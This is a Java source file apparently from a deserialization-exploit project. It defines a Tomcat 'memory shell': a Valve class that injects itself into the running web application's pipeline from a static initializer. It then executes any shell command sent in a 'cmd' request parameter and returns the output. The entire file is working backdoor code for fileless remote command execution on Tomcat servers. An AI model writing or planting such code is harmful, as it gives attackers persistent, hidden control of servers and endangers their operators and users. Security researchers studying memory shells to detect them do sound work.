package xyz.eki.marshalexp.memshell;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.valves.ValveBase;


import javax.servlet.ServletException;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

public class MTomcatValve extends ValveBase {
    static {
        System.out.println("Valve Injecting");
        try {

            Class<?> evilServletClass = MTomcatServlet.class;
            String valveName = evilServletClass.getSimpleName();

            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            // 添加自定义 Valve
            standardContext.addValve(new MTomcatValve());
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println("Valve Injected");
    }
    public MTomcatValve(){

    }
    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        if (request.getParameter("cmd") != null) {
            String osTyp = System.getProperty("os.name");
            InputStream in = Runtime.getRuntime().exec((osTyp != null && osTyp.toLowerCase().contains("win")) ? new String[]{"cmd.exe", "/c", request.getParameter("cmd")}:new String[]{"sh", "-c", request.getParameter("cmd")}).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            response.getWriter().write(output);
            response.getWriter().flush();
            return;
        }

        this.getNext().invoke(request,response);
    }
}
